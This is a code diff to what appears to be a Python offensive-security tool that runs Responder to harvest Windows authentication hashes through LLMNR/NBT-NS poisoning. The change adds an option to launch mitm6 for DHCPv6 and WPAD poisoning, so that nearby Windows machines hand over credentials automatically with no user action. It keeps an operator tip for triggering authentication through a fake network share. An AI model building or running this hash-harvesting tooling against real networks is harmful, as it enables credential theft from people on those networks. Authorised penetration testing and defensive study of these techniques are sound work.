@@ -105,18 +105,27 @@ def captured() -> list[str]:
         return list(_hashes)
 
 
-def wait_and_capture(iface: str, timeout: int = 120) -> list[str]:
+def wait_and_capture(iface: str, timeout: int = 120,
+                     use_mitm6: bool = False) -> list[str]:
     start(iface)
 
     if _proc is None:
         tui.warn("Responder did not start — cannot harvest hashes.")
         return []
 
-    tui.info(
-        f"Waiting {timeout}s for LLMNR/NBT-NS hash captures ...\n"
-        f"  Tip: on Windows targets, browse to a non-existent network path\n"
-        f"       e.g. type \\\\fakeshare1234 in Explorer to trigger auth."
-    )
+    if use_mitm6:
+        tui.info("Starting mitm6 to force Windows auth (DHCPv6 poisoning) ...")
+        start_mitm6(iface)
+        tui.info(
+            f"Waiting {timeout}s — mitm6 will force nearby Windows machines to\n"
+            f"  authenticate automatically via WPAD/IPv6 — no user action needed."
+        )
+    else:
+        tui.info(
+            f"Waiting {timeout}s for LLMNR/NBT-NS hash captures ...\n"
+            f"  Tip: on Windows targets, browse to a non-existent network path\n"
+            f"       e.g. type \\\\fakeshare1234 in Explorer to trigger auth."
+        )
 
     deadline = time.time() + timeout
     bar_w    = 40
@@ -142,6 +151,8 @@ def wait_and_capture(iface: str, timeout: int = 120) -> list[str]:
         time.sleep(1)
     print()
     stop()
+    if use_mitm6:
+        stop_mitm6()
     return captured()
 
 
